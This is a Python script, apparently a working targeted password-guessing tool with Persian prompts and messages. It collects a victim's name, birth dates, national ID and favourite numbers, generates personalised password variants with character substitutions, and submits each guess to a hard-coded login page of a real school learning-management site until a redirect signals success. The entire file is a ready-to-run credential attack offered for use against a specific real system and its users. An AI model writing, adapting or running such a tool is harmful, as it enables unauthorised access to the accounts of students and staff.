import itertools
import sqlite3
from datetime import datetime
import requests

class PasswordCracker:
    def __init__(self):
        self.user_data = self.get_user_info()
        self.conn = sqlite3.connect(":memory:")
        self._init_db()
        self.session = requests.Session()

        self.login_url = "https://lms3.alavischool.ir/login/index.php"

        self.char_replacements = {
            'a': ['@', '4'],
            's': ['$', '5'],
            'e': ['3'],
            'o': ['0'],
            'i': ['1', '!'],
            'b': ['8'],
            't': ['7'],
            'g': ['9'],
            'z': ['2']
        }

    def get_user_info(self):
        print("لطفاً اطلاعات مربوط به صاحب حساب را وارد کنید:")
        return {
            'first_name': input("نام: ").strip().lower(),
            'last_name': input("نام خانوادگی: ").strip().lower(),
            'birth_year': input("سال تولد (مثلاً 1375): ").strip(),
            'birth_month': input("ماه تولد (مثلاً 03): ").strip(),
            'birth_day': input("روز تولد (مثلاً 15): ").strip(),
            'national_id': input("کد ملی (اختیاری): ").strip(),
            'anniversary': input("تاریخ مهم (مثلاً 14000220): ").strip(),
            'favorite_numbers': [x.strip() for x in input("اعداد مورد علاقه (با کاما جدا کنید): ").split(',') if x.strip()],
            'other_info': [x.strip() for x in input("هر اطلاعات دیگر (با کاما جدا کنید): ").split(',') if x.strip()],
            'username': input("نام کاربری برای لاگین: ").strip()
        }

    def _init_db(self):
        self.conn.execute('''CREATE TABLE IF NOT EXISTS tested_passwords
                             (password TEXT PRIMARY KEY)''')

    def replace_chars(self, text):
        if not text:
            return ['']
        first_char = text[0].lower()
        remaining_combinations = self.replace_chars(text[1:])
        replacements = [first_char, first_char.upper()]
        if first_char in self.char_replacements:
            replacements += self.char_replacements[first_char]
        combinations = []
        for r in replacements:
            for rest in remaining_combinations:
                combinations.append(r + rest)
        return combinations

    def generate_name_combinations(self):
        first_name_variants = self.replace_chars(self.user_data['first_name'])
        last_name_variants = self.replace_chars(self.user_data['last_name'])
        for first in first_name_variants:
            for last in last_name_variants:
                yield first + last
                yield first + "_" + last
                yield first + "." + last
                yield first + last.capitalize()
                yield first.capitalize() + last.capitalize()

    def generate_date_combinations(self):
        date_parts = [
            self.user_data['birth_year'],
            self.user_data['birth_year'][2:] if len(self.user_data['birth_year']) >= 4 else '',
            self.user_data['birth_month'],
            self.user_data['birth_day'],
            self.user_data['birth_month'] + self.user_data['birth_day'],
            self.user_data['birth_day'] + self.user_data['birth_month'],
            self.user_data['anniversary']
        ]
        for part in date_parts:
            if part:
                yield part

    def generate_combinations(self):
        date_combinations = list(self.generate_date_combinations())

        for name_combo in self.generate_name_combinations():
            yield name_combo
            for num in self.user_data['favorite_numbers'] + date_combinations:
                if num:
                    yield name_combo + num
                    yield num + name_combo

        for date_part in date_combinations:
            yield date_part
            for num in self.user_data['favorite_numbers']:
                if num:
                    yield date_part + num
                    yield num + date_part

        for info in self.user_data['other_info']:
            if info:
                yield info
                for num in self.user_data['favorite_numbers'] + date_combinations:
                    if num:
                        yield info + num
                        yield num + info

    def check_password(self, password):
        payload = {
            'username': self.user_data['username'],
            'password': password
        }

        try:
            response = self.session.post(self.login_url, data=payload, allow_redirects=True)
            if response.url != self.login_url:
                return True  # آدرس تغییر کرده، پس رمز درست است
        except Exception as e:
            print(f"⚠️ خطا در ارسال درخواست: {e}")
        return False

    def run(self):
        print("\n🔐 شروع حمله هوشمند...")
        print(f"🎯 هدف: {self.login_url}")
        print(f"👤 کاربر: {self.user_data['username']}")
        
        tested = 0
        start_time = datetime.now()

        for password in self.generate_combinations():
            if not password:
                continue

            if self.conn.execute("SELECT 1 FROM tested_passwords WHERE password=?", (password,)).fetchone():
                continue

            self.conn.execute("INSERT INTO tested_passwords VALUES (?)", (password,))
            tested += 1

            print(f"[{tested}] تست: {password}")

            if self.check_password(password):
                print(f"\n✅ موفقیت! پسورد پیدا شد: {password}")
                return True

        print(f"\n❌ حمله کامل شد. پسورد پیدا نشد. مجموع پسورد تست‌شده: {tested}")
        return False

if __name__ == "__main__":
    cracker = PasswordCracker()
    cracker.run()
